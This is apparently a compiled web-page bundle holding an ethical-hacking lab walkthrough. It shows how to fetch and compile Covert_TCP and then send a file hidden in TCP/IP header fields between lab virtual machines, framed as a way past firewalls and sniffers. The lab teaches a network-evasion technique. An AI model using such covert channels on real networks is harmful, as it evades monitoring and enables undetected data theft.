import{_ as t,c as a,a1 as o,o as s}from"./chunks/framework.BDxlaA_J.js";const g=JSON.parse('{"title":"Covert Channels using Cover_TCP","description":"","frontmatter":{},"headers":[],"relativePath":"categories/ethical-hacking-labs/5-system-hacking/10-Covert_TCP.md","filePath":"categories/ethical-hacking-labs/5-system-hacking/10-Covert_TCP.md"}'),r={name:"categories/ethical-hacking-labs/5-system-hacking/10-Covert_TCP.md"};function c(i,e,n,l,d,h){return s(),a("div",null,e[0]||(e[0]=[o('<h1 id="covert-channels-using-cover-tcp" tabindex="-1">Covert Channels using Cover_TCP <a class="header-anchor" href="#covert-channels-using-cover-tcp" aria-label="Permalink to &quot;Covert Channels using Cover_TCP&quot;">​</a></h1><p>This program manipulates the TCP/IP header to transfer a file one byte at a time to a destination host.</p><p>Networks use network access control permissions to permit/deny the traffic through them. Tunneling is used to bypass the access control rules of firewalls, IDS, IPS, web proxies to allow certain traffic. Covert channels can be made by inserting data into unused fields of protocol headers. There are many unused or misued fields in TCP or IP over which data can be sent to bypass firewalls.</p><h3 id="covert-tcp" tabindex="-1"><code>Covert_TCP</code> <a class="header-anchor" href="#covert-tcp" aria-label="Permalink to &quot;`Covert_TCP`&quot;">​</a></h3><p>Covert_TCP manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can act like a server as well as a client and can be used to hide the data transmitted insied a IP header. This is useful when bypassing firewalls and sending data with legitimate looking packets that contain no data for sniffers to analyze.</p><h3 id="objectives" tabindex="-1">Objectives <a class="header-anchor" href="#objectives" aria-label="Permalink to &quot;Objectives&quot;">​</a></h3><ul><li>How to carry covert traffic inside of unused fields of TCP and IP headers.</li></ul><h3 id="requisites" tabindex="-1">Requisites <a class="header-anchor" href="#requisites" aria-label="Permalink to &quot;Requisites&quot;">​</a></h3><ul><li>Windows Server 2016/2012 virtual machine.</li><li>Kali Linux virtual machine.</li><li>Ubuntu Linux virtual machine.</li></ul><hr><h3 id="make-a-secret-message-file" tabindex="-1">Make a Secret Message File <a class="header-anchor" href="#make-a-secret-message-file" aria-label="Permalink to &quot;Make a Secret Message File&quot;">​</a></h3><p>In the Kali Linux, launch a new Terminal window.</p><ol><li><p>Create a folder named <strong>send</strong> on your <strong>Desktop</strong>, and navigate into it: <code>cd Desktop</code><code>mkdir send</code><code>cd send</code></p></li><li><p>Create a text file called <strong>message.txt</strong> inside <strong>send</strong> folder containing the string: <strong>Secret Message!</strong><code>echo &quot;Secret Message!&quot; &gt; message.txt</code></p></li></ol><h3 id="compile-convert-tcp" tabindex="-1">Compile <strong>convert_tcp</strong> <a class="header-anchor" href="#compile-convert-tcp" aria-label="Permalink to &quot;Compile **convert_tcp**&quot;">​</a></h3><ol start="3"><li><p>Download the <strong>covert_tcp.c</strong> file on the <strong>send folder:</strong><code>wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c</code></p></li><li><p>Compile the convert_tcp.c file: <code>cc -o covert_tcp covert_tcp.c</code><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/d1ba707cb8661a70e9081b65d5aec738b1a31d8e/covert-1.png" alt="covert-compile-1"></p></li></ol><h3 id="make-a-receiving-destination" tabindex="-1">Make a Receiving Destination <a class="header-anchor" href="#make-a-receiving-destination" aria-label="Permalink to &quot;Make a Receiving Destination&quot;">​</a></h3><ol start="5"><li><p>Go to your Ubuntu and open a new Terminal window.</p></li><li><p>Switch to super-user access: <code>sudo su</code></p></li><li><p>Start the <strong><a href="https://www.lifewire.com/tcpdump-linux-command-unix-command-4097081" target="_blank" rel="noreferrer">tcpdump</a></strong> as shown below: <code>tcpdump -nvvX port 8888 -i lo</code><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3667d22752bffd47fb4bdc59cd292264d2678674/covert-2.png" alt="tcp-dump-ubuntu-2"></p></li><li><p>Leave the <strong>tcpdump listener</strong> running and open another Terminal window or tab.</p></li><li><p>Go to Desktop and create a folder named <strong>receive</strong> and navigate into it: <code>cd Desktop</code><code>mkdir receive</code><code>cd receive</code></p></li><li><p>Download the <strong>covert_tcp.c</strong> file on the <strong>receive folder:</strong><code>wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c</code></p></li><li><p>Compile the convert_tcp.c file: <code>cc -o covert_tcp covert_tcp.c</code> Note: In case you got some errors about <code>cc</code> command, install the compiler: <code>sudo apt install gcc</code></p></li></ol><h3 id="setup-a-listener" tabindex="-1">Setup a Listener <a class="header-anchor" href="#setup-a-listener" aria-label="Permalink to &quot;Setup a Listener&quot;">​</a></h3><ol start="12"><li>Start the Listener [Dest=Ubuntu, Source=Kali]: <code>./covert_tcp -dest 10.0.2.46 -source 10.0.2.42 -source_port 9999 -dest_port 8888 -server -file /home/s4msepi0l/Desktop/receive/receive.txt</code><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Listener-ubuntu-covert-4.png" alt="Ubuntu-tcplistener"></li></ol><h3 id="launch-wireshark-on-kali" tabindex="-1">Launch Wireshark on Kali <a class="header-anchor" href="#launch-wireshark-on-kali" aria-label="Permalink to &quot;Launch Wireshark on Kali&quot;">​</a></h3><ol start="13"><li><p>Go back to Kali and Launch the Wireshark. <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Wireshark-Covert-5.png" alt="wireshark-kali-1"></p></li><li><p>Start the Wireshark capturing, double click on your primary network interface item: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Wireshark-Covert-6.png" alt="wirehsark-capturing-kali-2"></p></li></ol><h3 id="start-sending-the-secret-message" tabindex="-1">Start Sending the <strong>Secret Message</strong> <a class="header-anchor" href="#start-sending-the-secret-message" aria-label="Permalink to &quot;Start Sending the **Secret Message**&quot;">​</a></h3><ol start="15"><li>Minimize the Wireshark and open a new Terminal window on your Kali, navigate to the <strong>send</strong> folder.</li><li>Start sending the contents of message.txt file over TCP. <code>/covert_tcp -dest 10.0.2.46 -source 10.0.2.42 -source_port 8888 -dest_port 9999 -file /root/Desktop/send/message.txt</code><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/ec17197736d6b7a86925a36016d64c4ef5e25444/message-covert-7.png" alt="sendsecretmessage"> Covert_tcp starts sending the string one character at a time as shown above. If you switch to the termina window in Ubuntu, you will see the message beign received: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/ec17197736d6b7a86925a36016d64c4ef5e25444/message-covert-8.png" alt="receivingsecretmessage"></li></ol><h3 id="analyze-the-results" tabindex="-1">Analyze the Results <a class="header-anchor" href="#analyze-the-results" aria-label="Permalink to &quot;Analyze the Results&quot;">​</a></h3><ol start="17"><li><p>On your Ubuntu machine, stop the tcpdump pressing <strong>Ctrl+C</strong> as shown below: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0dc76e10644c655c0871c8910233c7869a725593/cover-9.png" alt="tcpdump-stop"> Tcpdump shows that no packets were captured in the network.</p></li><li><p>Navigate to <strong>/Desktop/receive/</strong> and double-click the <strong>receive.txt</strong> file to view its contents. You will see the full message saved in the file as shown below: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0dc76e10644c655c0871c8910233c7869a725593/covert-10.png" alt="secretmessage-kali"></p></li><li><p>Switch back to the <strong>Kali and Stop the packet capturing on the Wireshark</strong> by clicking on the top-left red switch.</p></li><li><p>Click on <strong>Apply a display filter</strong> field and type <strong>tcp</strong> to view only the TCP packets as show below: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/wireshark-covert-11.png" alt="apply-display-filter=tcp"></p></li></ol><p>If you examine the communication between Ubuntu and Kali (10.0.2.46 - 10.0.2.42) you will find each character of the message string being <strong>sent as individual packets over the network</strong> show on the next screenshots:</p><p>Covert_tcp changes the header of the TCP packets and replaces it with the characters of the string one character at a time to send the message without being detected.</p><p>Packet 1, string: <strong>S</strong><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/s-tcp-12.png" alt="tcp-1"></p><p>Packet 2, string: <strong>e</strong><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/e-tcp-13.png" alt="tcp-2"></p><p>Packet 3, string: <strong>c</strong><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/c-tcp-14.png" alt="tcp-3"></p><p>Packet 4, string: <strong>r</strong><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/r-tcp-15.png" alt="tcp-4"></p><p>(...) And so on until the entire message was completed.</p>',32)]))}const u=t(r,[["render",c]]);export{g as __pageData,u as default};
